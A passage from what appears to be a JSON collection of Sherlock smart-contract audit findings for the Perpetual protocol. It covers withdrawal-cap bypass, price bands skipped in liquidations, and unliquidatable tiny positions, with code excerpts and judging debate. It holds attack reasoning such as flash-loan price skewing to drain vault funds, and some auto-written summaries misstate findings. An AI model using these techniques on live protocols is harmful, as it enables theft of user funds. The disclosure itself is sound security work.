      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/118",
      "tags": [],
      "finders": [
        "PUSH0",
        "IllIllI"
      ]
    },
    {
      "id": "32169",
      "title": "M-6: Withdrawal caps can be bypassed by opening positions against the SpotHedgeBaseMaker",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/117 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nIllIllI\n## Summary\n\nDeposits/withdrawals of base tokens to the SpotHedgeBaseMaker aren't accounted for in the CircuitBreaker's accounting, so the tokens can be used by attackers to increase the amount withdrawable past the high water mark percentage limits.\n\n\n## Vulnerability Detail\n\nThe SpotHedgeBaseMaker allows LPs to deposit base tokens in exchange for shares. The CircuitBreaker doesn't include base tokens in its accounting, until they're converted to quote tokens and added to the vault, which happens when someone opens a short base position, and the SpotHedgeBaseMaker needs to hedge its corresponding long base position, by swapping base tokens for the quote token. The CircuitBreaker keeps track of net deposits/withdrawals of the quote token using a high water mark system, in which the high water mark isn't updated until the sync interval has passed. As long as the _net_ outflow between sync intervals doesn't pass the threshold, withdrawals are allowed.\n\n\n## Impact\n\nAssume there is some sort of exploit, where the attacker is able to artificially inflate their 'fund' amount (e.g. one of my other submissions), and are looking to withdraw their ill-gotten gains. Normally, the amount they'd be able to withdraw would be limited to X% of the TVL of collateral tokens in the vault. By converting some of their 'fund' to margin, and opening huge short base positions against the SpotHedgeBaseMaker, they can cause the SpotHedgeBaseMaker to swap its contract balance of base tokens into collateral tokens, and deposit them into its vault account, increasing the TVL to TVL+Y. Since the time-based threshold will still be the old TVL, they're now able to withdraw `TVL.old * X% + Y`, rather than just `TVL.old * X%`. Depending on the price band limits set for swaps, the attacker can use a flash loan to temporarily skew the base/quote UniswapV3 exchange rate, such that the swap nets a much larger number of quote tokens than would normally be available to trade for. This means that if the 'fund' amount that the attacker has control over is larger than the actual number of collateral tokens in the vault, the attacker can potentially withdraw 100% of the TVL.\n\n\n## Code Snippet\n\nQuote tokens acquired via the swap are deposited into the [vault](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L571), which passes them through the [CircuitBreaker](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/vault/Vault.sol#L339):\n```solidity\n// File: src/maker/SpotHedgeBaseMaker.sol : SpotHedgeBaseMaker.fillOrder()   #1\n\n415                } else {\n416                    quoteTokenAcquired = _formatPerpToSpotQuoteDecimals(amount);\n417 @>                 uint256 oppositeAmountXSpotDecimals = _uniswapV3ExactOutput(\n418                        UniswapV3ExactOutputParams({\n419                            tokenIn: address(_getSpotHedgeBaseMakerStorage().baseToken),\n420                            tokenOut: address(_getSpotHedgeBaseMakerStorage().quoteToken),\n421                            path: path,\n422                            recipient: maker,\n423                            amountOut: quoteTokenAcquired,\n424                            amountInMaximum: _getSpotHedgeBaseMakerStorage().baseToken.balanceOf(maker)\n425                        })\n426                    );\n427                    oppositeAmount = _formatSpotToPerpBaseDecimals(oppositeAmountXSpotDecimals);\n428                    // Currently we don't utilize fillOrderCallback for B2Q swaps,\n429                    // but we still populate the arguments anyways.\n430                    fillOrderCallbackData.amountXSpotDecimals = quoteTokenAcquired;\n431                    fillOrderCallbackData.oppositeAmountXSpotDecimals = oppositeAmountXSpotDecimals;\n432                }\n433    \n434                // Deposit the acquired quote tokens to Vault.\n435:@>             _deposit(vault, _marketId, quoteTokenAcquired);\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L405-L442\n\nThe CircuitBreaker only tracks [net liqInPeriod changes](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/circuitBreaker/LibLimiter.sol#L39-L49) changes during the withdrawal period, and only triggers the CircuitBreaker based on the TVL older than the withdrawal period:\n\n```solidity\n// File: src/circuitBreaker/LibLimiter.sol : LibLimiter.status()   #2\n\n119            int256 currentLiq = limiter.liqTotal;\n...\n126 @>         int256 futureLiq = currentLiq + limiter.liqInPeriod;\n127            // NOTE: uint256 to int256 conversion here is safe\n128            int256 minLiq = (currentLiq * int256(limiter.minLiqRetainedBps)) / int256(BPS_DENOMINATOR);\n129    \n130 @>         return futureLiq < minLiq ? LimitStatus.Triggered : LimitStatus.Ok;\n131:       }\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/circuitBreaker/LibLimiter.sol#L119-L131\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nCalculate the quote-token value of each base token during LP `deposit()`/`withdraw()`, and add those amounts as CircuitBreaker flows during `deposit()`/`withdraw()`, then also invert those flows prior to depositing into/withdrawing from the vault\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Medium/Low - Attacker would have to open a big short position against SpotHedgeBaseMaker during some time, exposing itself to losses due to price changes\n\n\n\n**tailingchen**\n\nValid but won't fix.\n\nAlthough circuit breaker can be bypassed, it still depends on the liquidity of SpotHedgeBaseMaker and the price band.\nThe team prefers not to fix it in the early stages. \n\nIf the team want to fix it in the future, we have discussed several possible solutions. These solutions all have some pros and cons. The team is still evaluating possible options.\n1. Separately calculate inflows and outflows for the same period. Only previous TVL is taken.\n2. Do not include whitelisted maker’s deposit into TVL calculations.\n3. Let SHBM check the current rate limit status of CircuitBreaker before depositing collateral into the vault. If the remaining balance that can be withdrawn is too small, it means that the current vault risk is too high and there is a risk that it cannot be withdrawn. Therefore, SHBM can refuse this position opening.",
      "summary": "\nThe issue reported is that the withdrawal caps can be bypassed by opening positions against the SpotHedgeBaseMaker. This means that attackers can use the base tokens deposited in the SpotHedgeBaseMaker to increase the amount of tokens they can withdraw, even beyond the limit set by the protocol. This can happen because the CircuitBreaker, which is responsible for tracking deposits and withdrawals, does not account for base tokens until they are converted into quote tokens and added to the vault. This allows attackers to artificially inflate their funds and withdraw more than they should be able to. The impact of this vulnerability is that attackers can potentially withdraw 100% of the total value locked in the protocol. The issue was found by a user named IllIllI and has been acknowledged by the protocol. The vulnerability was found through a manual review and the team is currently evaluating possible solutions to fix it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/117",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "32168",
      "title": "M-5: Price band caps apply to decreasing orders, but not to liquidations",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116 \n\n## Found by \nIllIllI\n## Summary\n\nPrice band caps limit the price at which an order can be settled (e.g. someone trying to reduce their exposure in order to avoid liquidation), but liquidations have no such limitation.\n\n\n## Vulnerability Detail\n\nPrice bands are [used](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/test/orderGatewayV2/OrderGatewayV2.settleOrder.int.t.sol#L1269-L1273) in order to ensure that users can't trade a extreme prices, which would result in lower-than usual fees, and liquidations to be less likely, because borrowing fees, funding fees, and liquidation penalties are all based on the opening notional value, rather than the current position size's value, and the reduced fee wouldn't be enough incentive to liquidate the position.\n\nHaving price caps means that even if there are two willing parties willing to settle a trade at a market-determined price, they will be prevented from doing so. In traditional financial markets, there are also trading halts when there is extreme price movement. The difference here is that while no trades are allowed during market halts in traditional finance, in the Perpetual system, liquidations are allowed to take place even if users can't close their positions.\n\n\n## Impact\n\nThe whole purpose of the OracleMaker is to be able to provide liquidity at _all_ times, though this liquidity may be available at a disadvantageous price. If there's a price band, anyone who tries to exit their position before they're liquidated (incurring a fee charged on top of losing the position), will have their orders rejected, even at the disadvantageous price. Note that orders interacting with the OracleMaker, and with other non-whitelisted makers (other traders) are executed by Relayers, who are expected to settle orders after a delay, so definitionally, they'll either be using a stale oracle price or will be executing after other traders have had a change to withdraw their liquidity. In either case, during periods of high volatility and liquidations, the price being used will no longer match the market's clearing price.\n\n\n## Code Snippet\n\nOrders modifying/creating positions have price band checks:\n```solidity\n// File: src/clearingHouse/ClearingHouse.sol : ClearingHouse._openPosition()   #1\n\n321                if (params.isBaseToQuote) {\n322                    // base to exactOutput(quote), B2Q base- quote+\n323                    result.base = -oppositeAmount.toInt256();\n324                    result.quote = params.amount.toInt256();\n325                } else {\n326                    // quote to exactOutput(base), Q2B base+ quote-\n327                    result.base = params.amount.toInt256();\n328                    result.quote = -oppositeAmount.toInt256();\n329                }\n330            }\n331:@>         _checkPriceBand(params.marketId, result.quote.abs().divWad(result.base.abs()));\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L321-L331\n\nbut liquidations don't have any price caps, and dont have any authorization checks, which means it can be executed without going through the order gateways and their [relayers](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/orderGatewayV2/OrderGatewayV2.sol#L161):\n```solidity\n// File: src/clearingHouse/ClearingHouse.sol : ClearingHouse.params   #2\n\n160        /// @inheritdoc IClearingHouse\n161        function liquidate(\n162            LiquidatePositionParams calldata params\n163:       ) external nonZero(params.positionSize) returns (int256, int256) {\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L160-L163\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nDon't use the price bands for trades against the OracleMaker. As is shown by some of my other submissions, removing the price bands altogether is not safe.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Low - Relayers will execute delayed order with the current market price, not a stale one. And the spread price will never be enough to make the price deviate too much to fail the price band check. If it happened, it should be considered an admin mistake. \n\n**takarez** commented:\n>  seem valid; medium(2)\n\n\n\n**vinta**\n\nThis is invalid I suppose. Indeed, `openPosition()` does have price band but `liquidate()` doesn't. However, liquidation is \"liquidator takes over the liquidatable position at Pyth oracle price\". So no need to have price band for liquidation I think.\n\nThough I agree that trading with OracleMaker doesn't really need price band, but I guess it won't hurt if we still check price band for OracleMaker. It's simpler on implementation (no extra code to check whether it's trading with OracleMaker).\n\n**IllIllI000**\n\n@vinta This submission is about the fact that a normal user will be unable to reduce their position if the OracleMaker's price is outside the price bands, leading to a liquidation they can't do anything to prevent. Can you elaborate on what part is invalid?\n\n**vinta**\n\n@IllIllI000 But how does OracleMaker's price be outside the price band? Since the price band is based on the oracle price +- xx% and OracleMaker's price is from the same oracle. Liquidation is also using the same oracle price.\n\n**IllIllI000**\n\n@vinta if traders keep hitting the same side of the bid or ask, the OracleMaker quotes a worse and worse price for the next trade. Eventually, the next 'worse price' will be pushed outside of the price bands, even though the pyth/oracle price is still at the midpoint of (within) the price band. The liquidation will be using the midpoint, but a trader wanting to reduce their position by reducing against the OracleMaker will only have access to the 'worse price', which may be outside of the bands and will therefore be rejected\n\n**vinta**\n\n@IllIllI000 You're right, that would be a problem. Yes, this is valid! Thank you for pointing out this.\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/perpetual-protocol/perp-contract-v3/pull/17\n\n\n**nirohgo**\n\nEscalate\n\nThis is a low:\n\n1. As the finding mentions, this may only be relevant for relayed trades that are delayed during high volatility. (either trader-to-trader or trader-to-oracle-maker)\n2. With regards to the Oracle maker, it always quotes within its configured max spread from the oracle price, so as long as the maximum spread is smaller than the price band it won't quote outside the price band (Admins are trusted to set these values correctly).\n3. So the only relevant case is trader-to-trader positions sent through the relayer where the pyth (market) price drops so quickly that it's outside the position's price band by the time it's settled (but not quickly enough to take the position directly from solid to liquidatable because then liquidation bots win anyway). However, if market conditions are that voletile and the trader tries to do an emeargency exit before liquidation, they can always use the Oracle Maker through the relayer which, as mentioned, will work inspite of the price band, or the SpotHedge maker directly.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> This is a low:\n> \n> 1. As the finding mentions, this may only be relevant for relayed trades that are delayed during high volatility. (either trader-to-trader or trader-to-oracle-maker)\n> 2. With regards to the Oracle maker, it always quotes within its configured max spread from the oracle price, so as long as the maximum spread is smaller than the price band it won't quote outside the price band (Admins are trusted to set these values correctly).\n> 3. So the only relevant case is trader-to-trader positions sent through the relayer where the pyth (market) price drops so quickly that it's outside the position's price band by the time it's settled (but not quickly enough to take the position directly from solid to liquidatable because then liquidation bots win anyway). However, if market conditions are that voletile and the trader tries to do an emeargency exit before liquidation, they can always use the Oracle Maker through the relayer which, as mentioned, will work inspite of the price band, or the SpotHedge maker directly.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IllIllI000**\n\nThe goal of the OracleMaker is to provide liquidity essentially at all times in order to collect fees (`...undesirable because he won’t be earning fees on that side` https://perp.notion.site/PythOraclePool-e99a88be051f4bc8be0b1310eb982cd4 ), and requiring that the max spread be smaller than the price bands severely limits this ability, so I don't think it's reasonable to say that the admin is supposed to do this when it contradicts the design of the `maxSpread` being a `Sensitivity of the maker’s price premium to its risk exposure` https://perp.notion.site/PythOraclePool-e99a88be051f4bc8be0b1310eb982cd4 , not a proxy for the price bands. Furthermore, the escalator's assertion that the price bands must be smaller than the max spread essentially trades one risk for another, without regard to the effects of the other risk (see the other valid bugs relating to abusing the price bands). I'll also note that the sponsor has already provided a PR for this issue, so it's not a risk they're willing to take.\n\n**nirohgo**\n\nStill, a lot of stars need to align for this to happen (max spread happens to be larger than price bands, sudden but not too sudden price drop, OM quote is at the maximum spread) and when they do, the trader has the option to use SHBM.\n\n**nevillehuang**\n\nI believe medium severity is appropriate for this issue.\n\n**WangSecurity**\n\nAgree that this issue should remain medium since it causes loss of funds under certain external conditions and breaks core functionality.\n\nPlanning to reject the escalation and leave the issue as it is.\n\n**nirohgo**\n\n@WangSecurity please note that this is invalid because it requires a (trusted) admin to make a configuration error: The Price Band config is the general, systemwide restriction on position price deviation from the oracle price. It applies to all positions and will fail/revert any position settlement that breaks this config. The max spread config is a specific configuration for the Oracle Maker that determines the maximum it's price can deviate from the oracle price. Setting a specific config to a value that exceeds a system wide limit (and will surely fail because of that) is a clear admin error.\n\n**WangSecurity**\n\nBut as I understand, @IllIllI000 proves [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116#issuecomment-2022203996) and [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116#issuecomment-2041446230) how your assumption can be broken, no? And as I understand, you agree with it [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116#issuecomment-2043835305).\n\n**nirohgo**\n\n> But as I understand, @IllIllI000 proves [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116#issuecomment-2022203996) and [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116#issuecomment-2041446230) how your assumption can be broken, no? And as I understand, you agree with it [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116#issuecomment-2043835305).\n\n@WangSecurity  both comments you mentioned are not proofs but rather are based on a claim (that setting contradicting values to these configurations is not an admin error), I'm making a counter claim (that it is). I suppose you need to make a call based on your own judgement between the two claims.\n\n**WangSecurity**\n\nAs I understand from [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116#issuecomment-2041446230) comment shows that the spread is not neccesseraly larger/smaller than the price band and the issue will happen if the spread is larger than the price band, then it will allow to bypass price bands during liquidations as shown [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116#issuecomment-2022203996). I see that there are lots of conditions that have to align to make it work, but this is a broken core functionality allowing the attacker to bypass the price bands.\n\nHence, I believe medium is appropriate, planning to reject the escalation and leave the issue as it is.\n\n**nirohgo**\n\n@WangSecurity the first comment simply states that there's a legitimate reason to set the specific OM max spread to be larger then the general limitation of the price band. (which I claim is an admin error). The second comment merely states that the trader price will be worse than the liquidation price (which is by design and has nothing to do with this escalation) and that the trader price can be rejected because it may exceed the price band limit which again, can only happen if admins set the OM max spread to a larger value than the price band setting (which I claim is an admin error).\n\n**WangSecurity**\n\n@nirohgo @IllIllI000 the question is: is it documented anywhere (docs/code comments/discord msgs) that the max spread cannot exceed price bands, i.e. is it an invariant that the team will hold?\n\n**IllIllI000**\n\nNo it's not - not that I'm aware of\n\n**nirohgo**\n\n> @nirohgo @IllIllI000 the question is: is it documented anywhere (docs/code comments/discord msgs) that the max spread cannot exceed price bands, i.e. is it an invariant that the team will hold?\n\n@WangSecurity So, you're saying that on Sherlock a trusted admin error only counts as such if there's a specific documentation of it? The fact that it stems from basic logic is not enough?\n\n**WangSecurity**\n\n@nirohgo please share where that logic comes from.\n\n**nirohgo**\n\n> @nirohgo please share where that logic comes from.\n\n@WangSecurity Sure: The admin sets one configuration (price band) that limits price deviation from oracle across all positions (and will fail any settlement that breaks this limit). The OM max spread configuration determines by how much the OM price can deviate from oracle (so you can think about it as a more specific configuration that applies to the OM price). If the admin sets max spread to be larger than Price Band they are making a logical error (because whenever the spread exceeds price band the settlement will fail). Its as if the admin would be breaking a rule they themselves set in another config.\n\n\n**IllIllI000**\n\nI disagree that the intention was to use the price bands as a global limit for all trades. If you look at the origin of the bands, it was this test where a user gains an advantage by trading with themselves with an arbitrary price\n```solidity\n    // FIXME: We shouldn't allow this to happen\n    // probably add price band in OrderGatewayV2 or ClearingHouse,\n    // only allow order.price to be oracle price +- 10% when settling orders\n    // See https://app.asana.com/0/1202133750666965/1206662770651731/f\n    function test_SettleOrder_AtExtremePrice() public {\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/test/orderGatewayV2/OrderGatewayV2.settleOrder.int.t.sol#L1269-L1273\n\nI had forgotten that I had asked this, but it's clear that their intention for the band was to protect against the scenario in the test, where a user trades with themselves:\n```text\nIllIllI — 03/14/2024\nhi, can you elaborate on the problem that is solved by having price bands? \n    // FIXME: We shouldn't allow this to happen\n    // probably add price band in OrderGatewayV2 or ClearingHouse,\n    // only allow order.price to be oracle price +- 10% when settling orders\n    // See https://app.asana.com/0/1202133750666965/1206662770651731/f\n\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/test/orderGatewayV2/OrderGatewayV2.settleOrder.int.t.sol#L1269-L1273\nis it just to avoid fat finger issues, or is there some other issue with allowing any price, that I'm missing? it looks like there isn't any negative effect to the system besides maybe the funding fee, since margin covers the price difference. the asana link is private, so I can't view it \nbchen4 ʕ̢·͡˔·ོɁ̡ — 03/15/2024\nif taker order match maker order via OrderGatewayV2 with 1 wei price, these two position's openNotional are 1 wei, so they might not to pay borrowingFee or fundingFee \nand there might has problem when liquidation, because we will calculate penalty by openNotional, so liquidator might not has incentive to liquidate and it will increase bad debt risk of our system\n```\n\nThey ended up going with using bands in the [clearinghouse](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L290-L331), where they note that a _user_ can choose an arbitrary price, and reference the test above, and so they add a price band check later in the function.\n\n\n**nirohgo**\n\n> I disagree that the intention was to use the price bands as a global limit for all trades. If you look at the origin of the bands, it was this test where a user gains an advantage by trading with themselves with an arbitrary price\n> \n> ```solidity\n>     // FIXME: We shouldn't allow this to happen\n>     // probably add price band in OrderGatewayV2 or ClearingHouse,\n>     // only allow order.price to be oracle price +- 10% when settling orders\n>     // See https://app.asana.com/0/1202133750666965/1206662770651731/f\n>     function test_SettleOrder_AtExtremePrice() public {\n> ```\n> \n> https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/test/orderGatewayV2/OrderGatewayV2.settleOrder.int.t.sol#L1269-L1273\n> \n> I had forgotten that I had asked this, but it's clear that their intention for the band was to protect against the scenario in the test, where a user trades with themselves:\n> \n> ```\n> IllIllI — 03/14/2024\n> hi, can you elaborate on the problem that is solved by having price bands? \n>     // FIXME: We shouldn't allow this to happen\n>     // probably add price band in OrderGatewayV2 or ClearingHouse,\n>     // only allow order.price to be oracle price +- 10% when settling orders\n>     // See https://app.asana.com/0/1202133750666965/1206662770651731/f\n> \n> https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/test/orderGatewayV2/OrderGatewayV2.settleOrder.int.t.sol#L1269-L1273\n> is it just to avoid fat finger issues, or is there some other issue with allowing any price, that I'm missing? it looks like there isn't any negative effect to the system besides maybe the funding fee, since margin covers the price difference. the asana link is private, so I can't view it \n> bchen4 ʕ̢·͡˔·ོɁ̡ — 03/15/2024\n> if taker order match maker order via OrderGatewayV2 with 1 wei price, these two position's openNotional are 1 wei, so they might not to pay borrowingFee or fundingFee \n> and there might has problem when liquidation, because we will calculate penalty by openNotional, so liquidator might not has incentive to liquidate and it will increase bad debt risk of our system\n> ```\n> \n> They ended up going with using bands in the [clearinghouse](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L290-L331), where they note that a _user_ can choose an arbitrary price, and reference the test above, and so they add a price band check later in the function.\n\nDon't see how that's relevant as it doesn't change the fact that setting OM spread to be larger than Price Band will only result in the admin DOSing their own system (whenever OM price exceeds the price band).\n\n**IllIllI000**\n\nIt's documentation of an intended usage that has a flaw in the design, leading to a negative outcome which I believe @WangSecurity is trying to point out [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116#issuecomment-2072117193), and is the reason I submitted this finding. I believe all of the facts have been provided, so let's hear what they have to say.\n\n**WangSecurity**\n\nIt's not clear in readme / code comments / docs that the protocol planned on respecting the discussed invariant. Planning to reject the escalation and leave the issue as it is.\n\n**sherlock-admin3**\n\nThe Lead Senior Watson signed off on the fix.\n\n**Evert0x**\n\nResult:\nMedium\nUnique\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [nirohgo](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116/#issuecomment-2041337618): rejected",
      "summary": "\nThe bug report discusses a vulnerability in a system that allows users to trade at extreme prices, resulting in lower fees and less chance of liquidation. The system has price band caps in place to prevent this, but the bug report reveals that these caps do not apply to liquidations. This means that users can still be liquidated at extreme prices, even though the system is supposed to prevent this. The impact of this bug is that users may be charged higher fees and have a higher chance of being liquidated. The report also includes code snippets and discussions between different users and administrators about the issue and its resolution. The bug has been classified as medium severity and has been resolved successfully.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "32167",
      "title": "M-4: Attackers can create positions that have no incentive to be liquidated",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/115 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nIllIllI\n## Summary\n\nThere is no incentive to liquidate tiny positions, which may lead to insolvency\n\n\n## Vulnerability Detail\n\nA well-funded attacker (e.g. a competing exchange) can create millions of positions where each position's total open notional (and thus the liquidation fee given when closing the position) is smaller than the gas cost required to liquidate it if there's a loss.\n\n\n## Impact\n\nLots of small losses are equivalent to one large loss, which will lead to bad debt that the exchange will have to cover in order to allow others to withdraw from the PnL pool\n\n\n## Code Snippet\n\nThere is [no](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/config/Config.sol) minimum position size, and the liquidation incentive is based on the total open notional (average cost to open):\n```solidity\n// File: src/clearingHouse/LibLiquidation.sol : LibLiquidation.getPenalty()   #1\n\n73        /// @notice penalty = liquidatedPositionNotionalDelta * liquidationPenaltyRatio, shared by liquidator and protocol\n74        /// liquidationFeeToLiquidator = penalty * liquidation fee ratio. the rest to the protocol\n75        function getPenalty(\n76            MaintenanceMarginProfile memory self,\n77            uint256 liquidatedPositionSizeDelta\n78        ) internal view returns (uint256, uint256) {\n79            // reduced percentage = toBeLiquidated / oldSize\n80            // liquidatedPositionNotionalDelta = oldOpenNotional * percentage = oldOpenNotional * toBeLiquidated / oldSize\n81            // penalty = liquidatedPositionNotionalDelta * liquidationPenaltyRatio\n82            uint256 openNotionalAbs = self.openNotional.abs();\n83 @>         uint256 liquidatedNotionalMulWad = openNotionalAbs * liquidatedPositionSizeDelta;\n84            uint256 penalty = liquidatedNotionalMulWad.mulWad(self.liquidationPenaltyRatio) / self.positionSize.abs();\n85            uint256 liquidationFeeToLiquidator = penalty.mulWad(self.liquidationFeeRatio);\n86            uint256 liquidationFeeToProtocol = penalty - liquidationFeeToLiquidator;\n87            return (liquidationFeeToLiquidator, liquidationFeeToProtocol);\n88:       }\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/LibLiquidation.sol#L73-L88\n\nFurthermore, even if somehow gas costs were free, the `mulWad()` used to calculate the penalty/fee rounds _down_ the total penalty as well as the portion that the liquidator gets, so one-wei open notionals will have a penalty payment of zero to the liquidator\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nHave a minimum total open notional for positions, to ensure there's a large enough fee to overcome liquidation gas costs. Also round up the fee\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Low - Gas fees on L2s are cheap, now more with Dencun update. An hypothetical attacker should use trillions of different addresses without gaining any profit doing it.\n\n**takarez** commented:\n>  POC of such attacked would have helped.\n\n\n\n**santipu03**\n\nEscalate\n\nI believe this issue should be LOW because of the impracticality of the attack. \n\nThe Perpetual protocol will be deployed on Optimism/Blast, where the gas costs are tiny, now even more with the Dencun update. To execute such an attack, one would need an insane amount of different addresses to even have a possibility of causing some bad debt, we're probably talking about billions of different addresses. \n\n**sherlock-admin2**\n\n> Escalate\n> \n> I believe this issue should be LOW because of the impracticality of the attack. \n> \n> The Perpetual protocol will be deployed on Optimism/Blast, where the gas costs are tiny, now even more with the Dencun update. To execute such an attack, one would need an insane amount of different addresses to even have a possibility of causing some bad debt, we're probably talking about billions of different addresses. \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**nevillehuang**\n\n@IllIllI000 Could you present a numerical scenario where this attack is practical?\n\n**IllIllI000**\n\nEscalate\n\nI believe this issue (#115) should have at least as high a severity as #112.\n\nTo address the above escalation on feasibility:\nIf you look at transactions relating to the [pyth oracle](https://optimistic.etherscan.io/address/0xff1a0f4744e8582DF1aE09D5611b887B6a12925C#internaltx), they're mostly related to synthetix transactions (synthetix is a perpetual futures DEX, just like perpetual), and most of executions that are similar to what a perpetual liquidation would be, are for ~$0.40-$0.60, (e.g. [this one](https://optimistic.etherscan.io/tx/0x95c85b339a8a16d4cb3b44b0585c8efe3f5cd6826763c9e07000dc42889f8d0e)). If you look through the tests, the expected liquidation penalty is 2.5%, and the penalty is split 50-50 with the protocol, so in order to hit this scenario, you'd be able to submit an order for $0.50 / 0.025 / 0.5 = $40.00 and not have to fear being liquidated, because the fee the liquidator would get would be less than the gas cost to liquidate. $40 is small enough that this scenario will likely happen organically, when traders open high-leverage trades against small account values, as is often done on DEXes. Alternatively, a determined attacker can create 1000 such transactions to reach a position size of $40k, with a cost of only $500 in transaction fees, plus whatever the current margin requirements are.\n\nWhy #115 should be at least as high as #112:\nBoth issues describe scenarios in which a trader can create positions where there is higher risk than the normal risk parameters would allow them to, without having to worry about being liquidated. In both cases, the risk is that bad debt will be created before the position is liquidated. Both issues can be somewhat mitigated by the admin changing the risk parameters (either the margin requirements for #112, or the liquidation penalty for #115), and in both cases the admin can specifically manually target specific positions by sandwiching them with changes to the parameter and doing the liquidation in between the sandwich, in order to avoid the parameters affecting other users. Both issues can be used together by the same attacker to increase the risk of the position over what is possible with only one, but fixing one does not fix the other. Both would require off-chain monitoring to apply the sandwich workarounds, whenever the issue pops up, but I believe #115 would occur _more_ frequently, since it can happen by accident.\n\nI submitted #115 as Med since the admin could decide to override the normal parameters, as is described above, and #112 has the same workaround, so they should have the same severity. If one is a High, the other is too.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> I believe this issue (#115) should have at least as high a severity as #112.\n> \n> To address the above escalation on feasibility:\n> If you look at transactions relating to the [pyth oracle](https://optimistic.etherscan.io/address/0xff1a0f4744e8582DF1aE09D5611b887B6a12925C#internaltx), they're mostly related to synthetix transactions (synthetix is a perpetual futures DEX, just like perpetual), and most of executions that are similar to what a perpetual liquidation would be, are for ~$0.40-$0.60, (e.g. [this one](https://optimistic.etherscan.io/tx/0x95c85b339a8a16d4cb3b44b0585c8efe3f5cd6826763c9e07000dc42889f8d0e)). If you look through the tests, the expected liquidation penalty is 2.5%, and the penalty is split 50-50 with the protocol, so in order to hit this scenario, you'd be able to submit an order for $0.50 / 0.025 / 0.5 = $40.00 and not have to fear being liquidated, because the fee the liquidator would get would be less than the gas cost to liquidate. $40 is small enough that this scenario will likely happen organically, when traders open high-leverage trades against small account values, as is often done on DEXes. Alternatively, a determined attacker can create 1000 such transactions to reach a position size of $40k, with a cost of only $500 in transaction fees, plus whatever the current margin requirements are.\n> \n> Why #115 should be at least as high as #112:\n> Both issues describe scenarios in which a trader can create positions where there is higher 